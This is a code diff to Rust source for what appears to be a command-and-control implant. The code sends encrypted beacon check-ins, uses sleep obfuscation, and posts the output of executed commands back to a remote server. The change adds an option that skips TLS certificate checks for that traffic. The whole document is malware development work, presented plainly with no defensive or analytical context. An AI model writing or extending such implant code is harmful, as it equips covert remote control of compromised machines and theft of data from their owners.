@@ -48,6 +48,7 @@ pub struct CommsConfig {
     pub key: Vec<u8>,
     pub agent_id: [u8; 16],
     pub use_sleep_obfs: bool,
+    pub ignore_cert_errors: bool,
     pub max_retries: u32,
 }
 
@@ -169,7 +170,8 @@ fn beacon_loop(config: &CommsConfig, log: &LogSink) -> Result<(), String> {
         let checkin = protocol::serialize_checkin(&config.agent_id, &hostname, current_interval);
         let encrypted = protocol::encrypt_message(&checkin, &config.key);
 
-        match https::post(&session, &config.path, &encrypted, log) {
+        let post_fn = if config.ignore_cert_errors { https::post_insecure } else { https::post };
+        match post_fn(&session, &config.path, &encrypted, log) {
             Ok(response) => {
                 error_count = 0;
 
@@ -198,7 +200,7 @@ fn beacon_loop(config: &CommsConfig, log: &LogSink) -> Result<(), String> {
                                     &result.output,
                                 );
                                 let enc_result = protocol::encrypt_message(&result_msg, &config.key);
-                                let _ = https::post(&session, &config.result_path, &enc_result, log);
+                                let _ = post_fn(&session, &config.result_path, &enc_result, log);
                             }
                         }
                         Err(_) => {}
